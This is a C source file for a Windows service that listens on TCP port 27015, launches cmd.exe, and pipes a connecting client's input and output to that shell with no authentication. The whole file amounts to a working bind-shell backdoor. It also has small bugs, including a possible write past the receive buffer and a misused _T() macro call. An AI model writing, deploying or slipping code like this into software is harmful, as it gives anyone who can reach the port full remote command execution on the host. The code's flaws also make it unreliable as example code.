#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include "stdafx.h"
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <strsafe.h>
#include "ssrv_service.h"

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
// #pragma comment (lib, "Mswsock.lib")

#define DEFAULT_BUFLEN 4096
#define DEFAULT_PORT "27015"
#define BUFSIZE 4096 

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

HANDLE g_hInputFile = NULL;
SOCKET gListenSocket = INVALID_SOCKET;

void CreateChildProcess(void);
DWORD WINAPI WriteToPipe(char * msgBuf);
DWORD ReadFromPipe(char ** pMsgBuf, int * pMsgBufLen);
void ErrorExit(PTSTR);
int InitPipe();
void ClosePipe();
void CloseListen();
int TransmitFromCmd(void* buf);
int TransmitToCmd(SOCKET ClientSocket);


int ServerMain(DWORD *SvcState)
{
	int iResult;

	SOCKET ClientSocket = INVALID_SOCKET;

	struct addrinfo *result = NULL;
	struct addrinfo hints;

	int iSendResult;
	char * recvbuf = (char*)calloc(DEFAULT_BUFLEN, sizeof(char));
	int recvbuflen = DEFAULT_BUFLEN;



	// Initialize Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		printf("WSAStartup failed \n");
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	gListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (gListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(gListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(gListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(gListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(gListenSocket);
		WSACleanup();
		return 1;
	}

	InitPipe();

	// Accept a client socket
	ClientSocket = accept(gListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed with error: %d\n", WSAGetLastError());
		closesocket(gListenSocket);
		WSACleanup();
		return 1;
	}

	// No longer need server socket
	closesocket(gListenSocket);
	gListenSocket = INVALID_SOCKET;

	// Create the thread to begin execution on its own.
	DWORD   dwThreadId;
	HANDLE hThread;

	hThread = CreateThread(
		NULL,                   // default security attributes
		0,                      // use default stack size  
		(LPTHREAD_START_ROUTINE)TransmitFromCmd,       // thread function name
		(LPVOID)ClientSocket,          // argument to thread function 
		0,                      // use default creation flags 
		&dwThreadId);   // returns the thread identifier 
	if (hThread == NULL)
	{
		printf("CreateThread");
		return 1;
	}

	TransmitToCmd(ClientSocket);

	WaitForSingleObject(hThread, INFINITE);

	// cleanup
	WSACleanup();

	return 0;
}

int TransmitToCmd(SOCKET ClientSocket)
{
	int iResult, iSendResult;
	char * recvbuf = (char*)calloc(DEFAULT_BUFLEN, sizeof(char));
	int recvbuflen = DEFAULT_BUFLEN;

	do {
		memset(recvbuf, 0, DEFAULT_BUFLEN);
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			printf("Bytes received: %d, Buffer: %s\n", iResult, recvbuf);

			recvbuf[iResult] = '\r';
			recvbuf[iResult + 1] = '\n';
			WriteToPipe(recvbuf);
		}
		else if (iResult == 0){
			SvcReportInfo(_T("Connection closing...\n"));
			ClosePipe();
		}
		else  {
			SvcReportError(_T("recv failed with error: %d\n", WSAGetLastError()));
			return 1;
		}
	} while (iResult > 0);
	return 0;
}

int TransmitFromCmd(void* buf)
{
	SOCKET ClientSocket = (SOCKET)buf;
	int iResult, iSendResult;
	char * recvbuf = (char*)calloc(DEFAULT_BUFLEN, sizeof(char));
	int recvbuflen = DEFAULT_BUFLEN;

	do {
		if (ReadFromPipe(&recvbuf, &recvbuflen)){
			closesocket(ClientSocket);
			SvcReportError(_T("Pipe closed error"));
			return 1;
		}
		// mb need more than one read-send operations for large output
		iSendResult = send(ClientSocket, recvbuf, recvbuflen, 0);
		printf("Bytes sent: %d\n", iSendResult);
		if (iSendResult == SOCKET_ERROR) {
			printf("send failed with error: %d\n", WSAGetLastError());
			closesocket(ClientSocket);
			return 1;
		}
	} while (iSendResult != SOCKET_ERROR);
	return 0;
}

int InitPipe()
{
	SECURITY_ATTRIBUTES saAttr;

	printf("\n->Start of parent execution.\n");

	// Set the bInheritHandle flag so pipe handles are inherited. 

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	// Create a pipe for the child process's STDOUT. 

	if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
		ErrorExit(TEXT("StdoutRd CreatePipe"));

	// Ensure the read handle to the pipe for STDOUT is not inherited.

	if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
		ErrorExit(TEXT("Stdout SetHandleInformation"));

	// Create a pipe for the child process's STDIN. 

	if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
		ErrorExit(TEXT("Stdin CreatePipe"));

	// Ensure the write handle to the pipe for STDIN is not inherited. 

	if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
		ErrorExit(TEXT("Stdin SetHandleInformation"));

	// Create the child process. 

	CreateChildProcess();

	return 0;
}

void ClosePipe()
{
	CloseHandle(g_hChildStd_OUT_Wr);
	g_hChildStd_OUT_Wr = NULL;
	CloseHandle(g_hChildStd_IN_Wr);
	g_hChildStd_IN_Wr = NULL;
	CloseHandle(g_hChildStd_IN_Rd);
	g_hChildStd_IN_Rd = NULL;
	CloseHandle(g_hChildStd_OUT_Rd);
	g_hChildStd_OUT_Rd = NULL;
}

void CloseListen()
{
	if (gListenSocket != INVALID_SOCKET)
		closesocket(gListenSocket);
	gListenSocket = INVALID_SOCKET;
}

void CreateChildProcess()
// Create a child process that uses the previously created pipes for STDIN and STDOUT.
{
	TCHAR szCmdline[] = _T("cmd.exe");
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;
	BOOL bSuccess = FALSE;

	// Set up members of the PROCESS_INFORMATION structure. 

	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure. 
	// This structure specifies the STDIN and STDOUT handles for redirection.

	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	// Create the child process. 

	bSuccess = CreateProcess(NULL,
		szCmdline,     // command line 
		NULL,          // process security attributes 
		NULL,          // primary thread security attributes 
		TRUE,          // handles are inherited 
		0,             // creation flags 
		NULL,          // use parent's environment 
		NULL,          // use parent's current directory 
		&siStartInfo,  // STARTUPINFO pointer 
		&piProcInfo);  // receives PROCESS_INFORMATION 

	// If an error occurs, exit the application. 
	if (!bSuccess)
		ErrorExit(TEXT("CreateProcess"));
	else
	{
		// Close handles to the child process and its primary thread.
		// Some applications might keep these handles to monitor the status
		// of the child process, for example. 

		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);
	}
}


DWORD WINAPI WriteToPipe(char * msgBuf)
{
	DWORD dwWritten;
	HANDLE hParentStdIn = GetStdHandle(STD_INPUT_HANDLE);

	printf("WTP: %s, Len = %d\n", msgBuf, strlen(msgBuf));

	WriteFile(g_hChildStd_IN_Wr, msgBuf, (DWORD)strlen(msgBuf), &dwWritten, NULL);

	return 0;
}

DWORD ReadFromPipe(char ** pMsgBuf, int * pMsgBufLen)
{
	DWORD dwRead = 0, ret = 0;
	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

	ret = ReadFile(g_hChildStd_OUT_Rd, *pMsgBuf, BUFSIZE, &dwRead, NULL);
	*pMsgBufLen = (int)dwRead;
	return !ret;
}

void ErrorExit(PTSTR lpszFunction)

// Format a readable error message, display a message box, 
// and exit from the application.
{
	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40)*sizeof(TCHAR));
	StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error %d: %s"),
		lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
	ExitProcess(1);
}
